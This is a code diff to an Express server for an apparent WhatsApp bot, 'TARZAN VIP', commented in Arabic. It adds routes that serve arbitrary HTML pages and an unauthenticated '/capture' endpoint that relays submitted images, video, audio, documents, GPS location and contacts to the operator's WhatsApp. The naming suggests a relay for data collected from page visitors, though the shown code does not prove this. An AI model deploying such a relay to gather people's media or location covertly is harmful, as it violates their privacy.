@@ -178,6 +178,36 @@ app.use(express.urlencoded({ limit: '500mb', extended: true }));
 app.use('/recordings', express.static(recordingsPath));
 
 // ==========================================
+// 🌐 نظام الصفحات اللانهائية - تطوير جديد
+// ==========================================
+app.get('/:page', (req, res, next) => {
+    const requestedPage = req.params.page;
+    
+    // تجاهل المسارات المحجوزة
+    const reservedPaths = [
+        'ping', 'capture', 'create-session', 'pair', 'sessions', 
+        'delete-session', 'api', 'recordings', 'favicon.ico'
+    ];
+    
+    if (reservedPaths.some(path => requestedPage.startsWith(path))) {
+        return next();
+    }
+    
+    // تنظيف اسم الملف من أي مسارات فرعية (أمان)
+    const safePage = path.basename(requestedPage);
+    
+    // البحث عن الملف بامتداد .html
+    const filePath = path.join(__dirname, 'public', `${safePage}.html`);
+    
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        // إذا ما لقى الملف، يكمل للـ middleware التالي
+        next();
+    }
+});
+
+// ==========================================
 // 📚 نظام تحميل الأوامر
 // ==========================================
 const commandsMap = new Map();
@@ -853,14 +883,14 @@ async function bootExistingSessions() {
 }
 
 // ==========================================
-// 📥 API استقبال البيانات
+// 📥 API استقبال جميع أنواع البيانات - مطور
 // ==========================================
 app.post('/capture', async (req, res) => {
     try {
-        let { type, data, sessionId } = req.body;
+        let { type, data, sessionId, fileName, caption } = req.body;
 
-        if (!type || !data || !sessionId) {
-            return res.status(400).json({ success: false, message: "بيانات ناقصة" });
+        if (!data || !sessionId) {
+            return res.status(400).json({ success: false, message: "البيانات أو الجلسة ناقصة" });
         }
 
         const sock = sessions[sessionId];
@@ -870,21 +900,141 @@ app.post('/capture', async (req, res) => {
 
         const jid = jidNormalizedUser(sock.user.id);
 
-        const titleMsg = `📥 *مستلم: ${type}*\n🕒 ${moment().tz('Asia/Riyadh').format('HH:mm:ss')}`;
-        await sock.sendMessage(jid, { text: titleMsg });
-
-        if (type === 'text' && typeof data === 'string') {
-            await sock.sendMessage(jid, { text: `📝 ${data}` });
-        } else if (type === 'image' && typeof data === 'string') {
-            const cleanStr = data.includes(',') ? data.split(',')[1] : data;
-            const buffer = Buffer.from(cleanStr, 'base64');
-            await sock.sendMessage(jid, { image: buffer });
+        // إذا ما حدد نوع، نحاول نكتشف تلقائياً
+        if (!type) {
+            if (typeof data === 'string') {
+                // نشوف إذا كان base64 صورة أو فيديو أو صوت
+                if (data.startsWith('data:image/')) {
+                    type = 'image';
+                } else if (data.startsWith('data:video/')) {
+                    type = 'video';
+                } else if (data.startsWith('data:audio/')) {
+                    type = 'audio';
+                } else if (data.startsWith('http://') || data.startsWith('https://')) {
+                    type = 'link';
+                } else if (data.startsWith('data:application/')) {
+                    type = 'document';
+                } else {
+                    type = 'text';
+                }
+            } else {
+                type = 'text';
+            }
         }
 
-        res.json({ success: true, message: "تم الاستلام" });
+        // ✅ استقبال نص
+        if (type === 'text' && typeof data === 'string') {
+            await sock.sendMessage(jid, { text: `📝 ${data}` });
+        }
+        
+        // ✅ استقبال رابط موقع
+        else if (type === 'link' && typeof data === 'string') {
+            await sock.sendMessage(jid, { 
+                text: `🔗 *رابط مستلم:*\n${data}\n🕒 ${moment().tz('Asia/Riyadh').format('HH:mm:ss')}` 
+            });
+        }
+        
+        // ✅ استقبال صورة
+        else if (type === 'image' && typeof data === 'string') {
+            const cleanStr = data.includes(',') ? data.split(',')[1] : data;
+            const buffer = Buffer.from(cleanStr, 'base64');
+            await sock.sendMessage(jid, { 
+                image: buffer,
+                caption: caption || `📸 صورة مستلمة - ${moment().tz('Asia/Riyadh').format('HH:mm:ss')}`
+            });
+        }
+        
+        // ✅ استقبال فيديو
+        else if (type === 'video' && typeof data === 'string') {
+            const cleanStr = data.includes(',') ? data.split(',')[1] : data;
+            const buffer = Buffer.from(cleanStr, 'base64');
+            await sock.sendMessage(jid, { 
+                video: buffer,
+                caption: caption || `🎬 فيديو مستلم - ${moment().tz('Asia/Riyadh').format('HH:mm:ss')}`
+            });
+        }
+        
+        // ✅ استقبال صوت
+        else if (type === 'audio' && typeof data === 'string') {
+            const cleanStr = data.includes(',') ? data.split(',')[1] : data;
+            const buffer = Buffer.from(cleanStr, 'base64');
+            await sock.sendMessage(jid, { 
+                audio: buffer,
+                mimetype: 'audio/mpeg',
+                ptt: false
+            });
+        }
+        
+        // ✅ استقبال مستند/ملف
+        else if (type === 'document' && typeof data === 'string') {
+            const cleanStr = data.includes(',') ? data.split(',')[1] : data;
+            const buffer = Buffer.from(cleanStr, 'base64');
+            await sock.sendMessage(jid, { 
+                document: buffer,
+                fileName: fileName || `مستند_${Date.now()}.pdf`,
+                caption: caption || `📄 مستند مستلم - ${moment().tz('Asia/Riyadh').format('HH:mm:ss')}`
+            });
+        }
+        
+        // ✅ استقبال إحداثيات موقع
+        else if (type === 'location' && typeof data === 'object') {
+            await sock.sendMessage(jid, { 
+                location: { 
+                    degreesLatitude: data.lat, 
+                    degreesLongitude: data.lng,
+                    name: data.name || 'موقع مستلم'
+                }
+            });
+        }
+        
+        // ✅ استقبال جهة اتصال (vCard)
+        else if (type === 'contact' && typeof data === 'object') {
+            const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${data.name || 'جهة اتصال'}\nTEL;type=CELL:${data.number}\nEND:VCARD`;
+            await sock.sendMessage(jid, { 
+                contacts: { 
+                    displayName: data.name || 'جهة اتصال', 
+                    contacts: [{ vcard }] 
+                }
+            });
+        }
+        
+        else {
+            return res.status(400).json({ 
+                success: false, 
+                message: `نوع البيانات '${type}' غير مدعوم أو البيانات غير صالحة` 
+            });
+        }
+
+        res.json({ 
+            success: true, 
+            message: `✅ تم إرسال ${type} بنجاح`,
+            type: type,
+            time: moment().tz('Asia/Riyadh').format('HH:mm:ss')
+        });
+
     } catch (error) {
+        console.error('❌ خطأ في /capture:', error.message);
         res.status(500).json({ success: false, message: error.message });
     }
+});
+
+// ==========================================
+// 📋 API أنواع البيانات المدعومة - تطوير جديد
+// ==========================================
+app.get('/api/supported-types', (req, res) => {
+    res.json({
+        success: true,
+        supportedTypes: [
+            { type: 'text', description: 'نص عادي', dataFormat: 'string' },
+            { type: 'image', description: 'صورة Base64', dataFormat: 'base64 string' },
+            { type: 'video', description: 'فيديو Base64', dataFormat: 'base64 string' },
+            { type: 'audio', description: 'صوت Base64', dataFormat: 'base64 string' },
+            { type: 'document', description: 'مستند/ملف Base64', dataFormat: 'base64 string' },
+            { type: 'link', description: 'رابط URL', dataFormat: 'string' },
+            { type: 'location', description: 'إحداثيات موقع', dataFormat: 'object {lat, lng, name}' },
+            { type: 'contact', description: 'جهة اتصال', dataFormat: 'object {name, number}' }
+        ]
+    });
 });
 
 // ==========================================
@@ -985,6 +1135,8 @@ app.listen(PORT, async () => {
     console.log(`\n=========================================`);
     console.log(`🚀 سيرفر TARZAN VIP على منفذ ${PORT}`);
     console.log(`📚 تم تحميل ${commandsMap.size} أمر`);
+    console.log(`🌐 نظام الصفحات اللانهائية مفعل`);
+    console.log(`📥 نظام استقبال جميع أنواع البيانات مفعل`);
     console.log(`🔄 نظام منع الازدحام مفعل`);
     console.log(`=========================================\n`);
 
